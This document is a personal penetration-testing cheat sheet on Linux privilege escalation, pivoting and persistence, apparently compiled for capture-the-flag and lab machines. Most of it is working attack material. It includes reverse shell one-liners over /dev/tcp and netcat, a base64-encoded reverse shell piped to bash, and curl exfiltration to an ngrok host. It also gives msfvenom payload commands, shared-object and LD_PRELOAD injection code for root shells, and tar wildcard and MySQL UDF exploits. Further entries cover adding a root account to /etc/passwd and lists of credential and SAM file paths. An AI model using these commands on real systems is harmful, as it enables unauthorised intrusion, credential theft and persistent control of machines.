# Pathways

`https://www.revshells.com/`

## send script
`wget https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F253%2Fmerge/linpeas.sh` 
`wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64`
`wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`
`python3 -m http.server 8080 -> wget http://IP:8080/filename`
`python3 -m http.server 8080`
`nc -w -3 10.10.36.138 1337 < LinEnum.sh -> nc -w -3 10.10.36.138 1337 < LinEnum.sh`
* setup ftp
* setup shares
`kuku copy the script and run as executable`

# Search interesting keywords

* password, token, company name, hostname

* Scan with linPEAS, Enum4linux, LinEnum | 
* if not exec find SUID -> find all in gtfobins
* * find / -perm -u=s -type f 2>/dev/null
* * find / -perm +6000 2>/dev/null | grep '/bin/'
* * find / -perm -4000 2>/dev/null
* * find / -group utmp 2>/dev/null  >>>  use utmpdump <file>
* * find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null  // Find all the SUID/SGID executables

# if RCE
//check writer write-up
* echo -n "bash -c 'bash -i >& /dev/tcp/<YOURIP>/<PORT> 0>&1'" | base64
* * `echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTUuMC4zMSAyNDQzID4vdG1wLwo= | base64 -d | bash `;
* curl http://ngrokserver/$(find / -name flag.txt -type f) --> can be id_rsa 

/usr/local/bin/suid-env
/usr/local/bin/suid-so
* `ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no` 
* restricted shell -> `echo os.system("/bin/sh")`
# Manual enum
* sudo -l
* always ls -la
* check home dir (others also) 
* Check .ssh
* .bashrc || .bash_history
* check for files that can be read by users
* grep -Ri '\.backup' /etc 2>/dev/null
* look for things with username and passwords (configs backups) 
* * `grep -r "password\|conf\|backup\|key\|bak" *
* check netstat -nap (for internal ports) (if filtered use chisel)
* run nmap -p- localhost
* tcpdump
* lsattr <sus file>

# Priv esc

* chmod 4755 /bin/sh

# script powered with root
* chmod 4755 /bin/dash ===> dash

# Check history
```
cat ~/.*history | less
```
# Grep storage mount

`grep -B2 -A2 -a 'regex' /dev/mount 

# check logs
`audit` `cat all logs grep` `aureport -l || --tty` 
## Use found private key

* Try to get ///home/user/.ssh/id_rsa and crack or use it like that

```
chmod 600 root_key
ssh -i root_key root@10.10.10.10
```
# Port knocking
* check sequence `/etc/knockd.conf` 
* `for x in 7469 8475 9842; do nmap -Pn --max-retries 0 -p $x 192.168.56.144; done`
* `for x in 4000 5000 6000; do nmap -Pn --host_timeout 201 --max-retries 0 -p $x server_ip_address; done`

# Stable Shell

* `python -c 'import pty;pty.spawn("/bin/bash")'`
* `export TERM=xterm`
* CTRL + Z
* `stty raw -echo; fg`
* `stty -a` to get rows and cols

## Cat vpn configs

# When you can file read? check for sensitive files
`/var/www/index.php/html`
`/etc/apache2/sites-enabled/000-default.conf`

# Linux
```
authorized_keys
id_rsa
id_rsa.keystore
id_rsa.pub
known_hosts
/etc/issue (A message or system identification to be printed before the login prompt.)
/etc/motd (Message of the day banner content. Can contain information about the system owners or use of the system.)
/etc/passwd 
/etc/group 
/etc/resolv.conf (might be better than /etc/passwd for triggering IDS sigs)
/etc/shadow
/home/[USERNAME]/.bash_history or .profile
~/.bash_history or .profile
$USER/.bash_history or .profile
/root/.bash_history or .profile
# Usually found in the root of the website
.htaccess
config.php
/etc/mtab  
/etc/inetd.conf  
/var/log/dmessage
/var/mail/<user>
/etc/httpd/logs/acces_log 
/etc/httpd/logs/error_log 
/var/www/logs/access_log 
/var/www/logs/access.log 
/usr/local/apache/logs/access_log 
/usr/local/apache/logs/access.log 
/var/log/apache/access_log 
/var/log/apache2/access_log 
/var/log/apache/access.log 
/var/log/apache2/access.log
/var/log/access_log
.bash_history
.mysql_history
.my.cnf
/proc/sched_debug # Can be used to see what processes the machine is running
/proc/mounts
/proc/net/arp
/proc/net/route
/proc/net/tcp
/proc/net/udp
/proc/net/fib_trie
/proc/version
/proc/self/environ
```
# Windows

```
c:\WINDOWS\system32\eula.txt
c:\boot.ini  
c:\WINDOWS\win.ini  
c:\WINNT\win.ini  
c:\WINDOWS\Repair\SAM  
c:\WINDOWS\php.ini  
c:\WINNT\php.ini  
c:\Program Files\Apache Group\Apache\conf\httpd.conf  
c:\Program Files\Apache Group\Apache2\conf\httpd.conf  
c:\Program Files\xampp\apache\conf\httpd.conf  
c:\php\php.ini  
c:\php5\php.ini  
c:\php4\php.ini  
c:\apache\php\php.ini  
c:\xampp\apache\bin\php.ini  
c:\apache\php\php.ini  
c:\apache\logs\access.log
c:\xampp\apache\logs\access.log
c:\home2\bin\stable\apache\php.ini  
c:\home\bin\stable\apache\php.ini
c:\Program Files\Apache Group\Apache\logs\access.log  
c:\Program Files\Apache Group\Apache\logs\error.log
Systemroot is usually windows Try (.old)
windows\repair\SAM
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
`pwdump systemfile samfile`


# Common exp
* pkexec
* sudo
* dirty pipe
* timeout
* dirtycow

# Wrtieable script by root to everyone

`echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.93 9001 >/tmp/f" >> timeclock`

# SUID common when exec is used in exec

```
chmod +x exec
* ```export PATH=/home/user/:$PATH```  --- add to path for script exec
* echo "/bin/bash -p" > exec    --- copy bin bash to curl sample
```

# Cron job 

* detect with pspy64
* use suid above to exploit
* if hard path e.g (/usr/bin/exec) if python try exploiting libraries

# Sudo/Shell Wildcard

* `touch -- 'inject'` / is not supported so try bash

# SUID/SGID Shared Object Injectiom
`msfvenom -a x64 -p linux/x64/shell_reverse_tcp LHOST=<attacker IP> LPORT=<attacker LPORT> EXITFUNC=thread -f elf-so`

```			
The /usr/local/bin/suid-so SUID executable is vulnerable to shared object injection.

First, execute the file and note that currently it displays a progress bar before exiting:

/usr/local/bin/suid-so
`
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
	setuid(0);
	system("/bin/bash -p");
}
`

Run strace on the file and search the output for open/access calls and for "no such file" errors:

strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"

Note that the executable tries to load the /home/user/.config/libcalc.so shared object within our home directory, but it cannot be found.

Create the .config directory for the libcalc.so file:

mkdir /home/user/.config

Example shared object code can be found at /home/user/tools/suid/libcalc.c. It simply spawns a Bash shell. Compile the code into a shared object at the location the suid-so executable was looking for it:

gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c

Execute the suid-so executable again, and note that this time, instead of a progress bar, we get a root shell.

/usr/local/bin/suid-so
```

# SUID / SGID Executables - Environment Variables
```
The /usr/local/bin/suid-env executable can be exploited due to it inheriting the user's PATH environment variable and attempting to execute programs without specifying an absolute path.

First, execute the file and note that it seems to be trying to start the apache2 webserver:

/usr/local/bin/suid-env

Run strings on the file to look for strings of printable characters:

strings /usr/local/bin/suid-env

One line ("service apache2 start") suggests that the service executable is being called to start the webserver, however the full path of the executable (/usr/sbin/service) is not being used.

Compile the code located at /home/user/tools/suid/service.c into an executable called service. This code simply spawns a Bash shell:

gcc -o service /home/user/tools/suid/service.c

Prepend the current directory (or where the new service executable is located) to the PATH variable, and run the suid-env executable to gain a root shell:

PATH=.:$PATH /usr/local/bin/suid-env
```

# SUID / SGID Executables - Abusing Shell Features (#1)
```
The /usr/local/bin/suid-env2 executable is identical to /usr/local/bin/suid-env except that it uses the absolute path of the service executable (/usr/sbin/service) to start the apache2 webserver.

Verify this with strings:

strings /usr/local/bin/suid-env2

In Bash versions <4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.

Verify the version of Bash installed on the Debian VM is less than 4.2-048:

/bin/bash --version

Create a Bash function with the name "/usr/sbin/service" that executes a new Bash shell (using -p so permissions are preserved) and export the function:

function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service

Run the suid-env2 executable to gain a root shell:

/usr/local/bin/suid-env2
```
#  SUID / SGID Executables - Abusing Shell Features (#2)
```
Note: This will not work on Bash versions 4.4 and above.

When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debugging statements.

Run the /usr/local/bin/suid-env2 executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of /bin/bash:

env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2

Run the /tmp/rootbash executable with -p to gain a shell running with root privileges:

/tmp/rootbash -p
```
# find key 

`find / -name id_rsa 2> /dev/null`

# Expoiting writable /etc/passwd (highly unlikely)

* create passwd hash -> `openssl passwd -1 -salt [salt] [password]`
* `adding new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash to /etc/passwd will create a new root acct`  => password 123

# MYSQL Userdefined functions

```
cd /home/user/tools/mysql-udf
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
mysql -u root
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
exit
/tmp/rootbash -p
rm /tmp/rootbash
exit
```
# Screen SUID Name

* with `screen -dmS root \` use `screen -x root/`

# Gdb server exploit

* use multi/gdb/gdb_server_exec
* show targets
* show payloads (match arch)

# Mariadb Msql priv esc

* Create the reverse shell payload
* * msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f elf-so -o CVE-2021-27928.so
* Start a listener
* * nc -lvp <port>
* Copy the payload to the target machine (In this example, SCP/SSH is used)
* * scp CVE-2021-27928.so <user>@<ip>:/tmp/CVE-2021-27928.so
* Execute the payload
* *mysql -u <user> -p -h <ip> -e 'SET GLOBAL wsrep_provider="/tmp/CVE-2021-27928.so";'

# Readable /etc/shadow

``` 
copy hash to file
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

# writeable /etc/shadow

```
ls -l /etc/shadow
mkpasswd -m sha-512 newpasswordhere
replace hash in /etc/shadow
```
# writeable /etc/passwd

```
openssl passwd newpasswordhere
replace hash with x or generate new replica root
```

# SUDO vuln

```
sudo -l
https://gtfobins.github.io
```
## CE
* chmod 4755 /bin/bash 
* cp /bin/bash /home/user;chown root:root /home/user/bash;chmod 4755 /bin/bash

# SUDO env vuln
```
Check which environment variables are inherited (look for the env_keep options):

sudo -l

LD_PRELOAD and LD_LIBRARY_PATH are both inherited from the user's environment. LD_PRELOAD loads a shared object before any others when a program is run. LD_LIBRARY_PATH provides a list of directories where shared libraries are searched for first.

Create a shared object using the code located at /home/user/tools/sudo/preload.c:

gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c

Run one of the programs you are allowed to run via sudo (listed when running sudo -l), while setting the LD_PRELOAD environment variable to the full path of the new shared object:

sudo LD_PRELOAD=/tmp/preload.so "program-name-here"

A root shell should spawn. Exit out of the shell before continuing. Depending on the program you chose, you may need to exit out of this as well.

Run ldd against the apache2 program file to see which shared libraries are used by the program:

ldd /usr/sbin/apache2

Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located at /home/user/tools/sudo/library_path.c:

gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c

Run apache2 using sudo, while settings the LD_LIBRARY_PATH environment variable to /tmp (where we output the compiled shared object):

sudo LD_LIBRARY_PATH=/tmp apache2

A root shell should spawn. Exit out of the shell. Try renaming /tmp/libcrypt.so.1 to the name of another library used by apache2 and re-run apache2 using sudo again. Did it work? If not, try to figure out why not, and how the library_path.c code could be changed to make it work.
```


# Exploiting Crontab
```
Format of a Cronjob

Cronjobs exist in a certain format, being able to read that format is important if you want to exploit a cron job. 
# = ID
m = Minute
h = Hour
dom = Day of the month
mon = Month
dow = Day of the week
user = What user the command will run as
command = What command should be run
For Example,
#  m   h dom mon dow user  command
17 *   1  *   *   *  root  cd / && run-parts --report /etc/cron.hourly
```

`cat /etc/crontab`  to view what cron jobs are scheduled.

locate `cronscript.sh`

Chech if writable  `ls -l /usr/local/bin/cronscript.sh`
Generate payload on hostmachine with `msfvenom -p cmd/unix/reverse_netcat lhost=10.6.33.220 lport=8888 R`
OR
Generate 
```
#!/bin/bash
bash -i >& /dev/tcp/{local box}/4444 0>&1
```

Replace crontab content `echo [MSFVENOM OUTPUT] > autoscript.sh`

WAit for reverse shell listen with `nc -lnvp 8888`

## With Path (cronjob) 

```
When PATH=/home/user

make duplicate cronsript in path
`
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
`
chmod +x /home/user/overwrite.sh
/tmp/rootbash -p
```
## With wildcard tar (cronjob)

```
View the contents of the other cron job script:

cat /usr/local/bin/compress.sh

Note that the tar command is being run with a wildcard (*) in your home directory.

Take a look at the GTFOBins page for tar. Note that tar has command line options that let you run other commands as part of a checkpoint feature.

Use msfvenom on your Kali box to generate a reverse shell ELF binary. Update the LHOST IP address accordingly:

msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf

Transfer the shell.elf file to /home/user/ on the Debian VM (you can use scp or host the file on a webserver on your Kali box and use wget). Make sure the file is executable:

chmod +x /home/user/shell.elf

Create these two files in /home/user:

touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf

When the tar command in the cron job runs, the wildcard (*) will expand to include these files. Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.

Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener.

nc -nvlp 4444

Remember to exit out of the root shell and delete all the files you created to prevent the cron job from executing again:

rm /home/user/shell.elf
rm /home/user/--checkpoint=1
rm /home/user/--checkpoint-action=exec=shell.elf
```



# Expoiting Path

* kenobi

* Using suid scripts to gain root access with $PATH variable

## try -> bash -p

# LXD Priv esc

```
Among the more curious privilege escalation methods on Linux, lxd is certainly a mind-bender, to say the least. This technique involves leveraging a flaw in lxd, a program that we can use to spin up containers much akin to Docker. This exploit specifically involves abusing mount points to mount volumes from our victim machine (the machine we're attacking) within a container that we shouldn't be able to access/read. However, we have root powers on lxd containers - thus allowing us to bypass the read permission checks and escalate our privileges. We can perform this privesc method via the following steps:


```

`1. First, we need to check and see if our user is a member of the lxd group. We can do this with the command: id`

![image](https://i.imgur.com/wmztMtK.png)

2. Typically, this privesc can be a bit of a drawn-out process, however, in our case, we'll be able to skip part of the way through. To perform it properly, we have to perform the following steps.:

- Steps to be performed on the attacking machine:

- - Download build-alpine on your local machine via the git repository [https://github.com/lxd-images/alpine-3-7-apache-php5-6](https://github.com/lxd-images/alpine-3-7-apache-php5-6)

- - Execute the script "build -alpine" that will build the latest Alpine image as a compressed file. This must be executed by the root user.

- - Transfer this newly created tar file to the victim machine

- Steps to be performed on the victim machine:

- - Download the alpine image

- - Import image for lxd

- - Initialize the image inside a new container <- Worth checking the already imported/available images as you may be able to skip to this step

- - Mount the container inside the /root directory


3. For the sake of this example, we'll be skipping close to the end (see the bolded bit above) by checking what images are readily available on the machine in question. We can do that via the following command: lxc image list

4. run a series of commands which initialize, configure the disks, and start the container.
lxc init IMAGENAME CONTAINERNAME -c security.privileged=true



# Run linux exploit sugester

* perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl

## Dirty cow

```
gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
./c0w
/usr/bin/passwd
---- mv /tmp/bak /usr/bin/passwd--- restore
```


# NFS
```
Files created via NFS inherit the remote user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user.

Check the NFS share configuration on the Debian VM:

cat /etc/exports

Note that the /tmp share has root squashing disabled.

On your Kali box, switch to your root user if you are not already running as root:

sudo su

Using Kali's root user, create a mount point on your Kali box and mount the /tmp share (update the IP accordingly):

mkdir /tmp/nfs
mount -o rw,vers=2 10.10.10.10:/tmp /tmp/nfs

Still using Kali's root user, generate a payload using msfvenom and save it to the mounted share (this payload simply calls /bin/bash):

msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf

Still using Kali's root user, make the file executable and set the SUID permission:

chmod +xs /tmp/nfs/shell.elf

Back on the Debian VM, as the low privileged user account, execute the file to gain a root shell:

/tmp/shell.elf
```
## Alt
```
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash . || sh || dash
chmod +s bash || sh || dash
â€‹
#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```

# Capabilities

* https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities#cap_dac_read_search
* `getcap -r / 2>/dev/null` find cap recusivelly

# Backup expliots

* copy id_rsa to backup `ln -s ~/home/luis/.ssh/id_rsa /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/id_rsa`


# Docker
* https://youtu.be/-loZwD39ifc?t=2958
* foward ports through ssh  `ssh -L8000:127.0.0.1:8000 username@IP` or `~C` on ssh shell then `-L8000:127.0.0.1:8000` => map 8000 on your host to victim secret port
* check `ls /dev` to mount to disk
* `capsh --print` to check capabilities 
* * try kernel module reverse shell (ippsec monitor) site:greencashew.dev
* * run make file > kernelmodule.ko
* * insmod kernelmodule.ko (rm kernelmodule.ko) if error then retry
* run linpeas
* run deepsea
* with creds you can ssh into the main box
* if mount access to host with root priv (`mkdir -p /mnt/hola` `mount /dev/sda1 /mnt/hola`)
* * (docker) chmod 4777 sh
* * (host) ./sh

## Commands
* if image (docker inspect imagename)
* docker history --no-trunc imagename

* (docker-layer-extract (github))

# Forward ports

## SSH 
* foward local ports through ssh  `ssh -L8000:127.0.0.1:8000 username@IP` or `~C` on ssh shell then `-L8000:127.0.0.1:8000` => map 8000 on your host to victim secret port
* remote ports `ssh -R 2222:d76767.nyc.example.com:22 -R 5432:postgres3.nyc.example.com:5432 aws4.mydomain.ne` => `opens access to an internal Postgres database at port 5432 and an internal SSH port at port 2222.`

## Chisel

* Attacker -> ./chisel64 server -p 7000 --reverse
* * Victim (port) ./chisel64 client 10.10.16.34:7000 R:8443:localhost:8443 (IP of attacker)(R:PORT ON your box)
* * Victim (socks) ./chisel64 client 10.10.16.34:7000 R:socks (IP of attacker)(R:socks)

## Proxy Traffic in Linux
```
If you need to proxy your Kali system, the process is fairly similar. Start by using the ssh client to dynamically forward traffic from a local port. This can be done with a command similar to the following, where 9050 is our dynamic port.
```
`ssh -NfD 9050 root@159.246.29.206`
`Next we need to tell proxy chains where to send traffic from our programs. This can be set globally be using a command like the following.`

`echo "socks4\t127.0.0.1\t9050" >> /etc/proxychains.conf`
`To run an application through the socks proxy, simply prepend it with the proxychains command, like the following.`

proxychains iceweasel

# POST EXPLOIT

* if web box check for passwords
* * `find . | grep conf`
* * `grep -Ri pass`

# Pivot with metasploit

* meterpreter > run autoroute -s 192.2.3.0 -n 255.255.255.0
* background
* route print
* route add 192.69.228.0 255.255.255.0 1 (subnet netmask session id)
## Scan
* use auxiliary/scanner/portscan/tcp
* set PORTS 80, 8080, 445, 21, 22
* set RHOSTS 192.69.228.3-10
* exploit
* go back to the session 
* portfwd add -l 1234 -p 21 -r 192.3.3.3 (remote hosts)
* portfwd list

# Add route in linx

* `sudo ip route add 10.86.74.0/24 via 192.168.193.85` (`sudo route delete -net 10.86.74.0/24`)

## Using default proxchains 4

* use auxiliary/server/socks4a
* set SRVPORT 9050 -> to match /etc/proxyc `socks4 127.0.0.1 9050` 
* exploit

## Nmap

* proxychains nmap -sT -Pn IP/IP range (IP of the actual box)

## Browsing in firefox

* go to settings and adjust

## Getting shell

* try a bind shell and use `proxychains nc IP PORT`

# Upgrade a shell in metasploit

* sessions -u 1

## Persistence

* Create new root 
* * create passwd hash -> `openssl passwd -1 -salt [salt] [password]`
    `adding new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/bin/bash to /etc/passwd will create a new root acct`  
* Gen ssh and add ssh to auth keys -> IPPSEC crosfit video

## enum modified folder/files

* find /path -printf "%f\t%p\t%u\t%g\t%m\n" 2>/dev/null | cloumn -t
* find / -user <username> 2>/dev/null | grep -v '/proc\|/run\|/var/www'
* find / -type f -printf "%T+ %p\n" 2>/dev/null | grep -v '0000\|/proc\|/run\|/var\|.pyc\|/var/log\|/var/lib\|/etc\|/boot\|python'
* find / -type f -printf "%T+ %p\n" 2>/dev/null | grep 00:00:00 | grep -v '/sys\|/proc\|/sys'


## check for kernel exploit


# Reset passwd on physical ubuntu

* hold esc on reboot
* access advanced options -> recovey -> drop as root
* ls /home -> passwd user

## Priv esc on a physical ubuntu server

* press ctrl + alt + del
* on the select os menu, press e
* scroll down to the linux line
```
vg-root ro 
	initrd 		/init.img-4.xxxxxx
```
* change to this line
`vg-root rw init=/bin/sh`
* press ctrl + x

# break out from restricted environments
* `echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null`

# Metasploit ShellCode (from christian)

```
msfvenom -b '\0' -p linux/x64/meterpreter/reverse_tcp LHOST=yourip LPORT=yourport -f raw -o meterpreter_linux_rev_tcp.bin
xxd -i meterpreter_linux_rev_tcp.bin | grep 0x | tr -d '\n, ' | sed 's/0x/\\x/g' | tee meterpreter_linux_rev_tcp.hex && echo
```
```
msfvenom -b '\x00\x0a\x0d\x20' -p linux/x64/shell/reverse_tcp LHOST=10.10.10.118 LPORT=4444 -f c 
```

# no ss or netstat
* /proc/net
* * /proc/net/tcp (convert hex to ip):echo $((port)) 
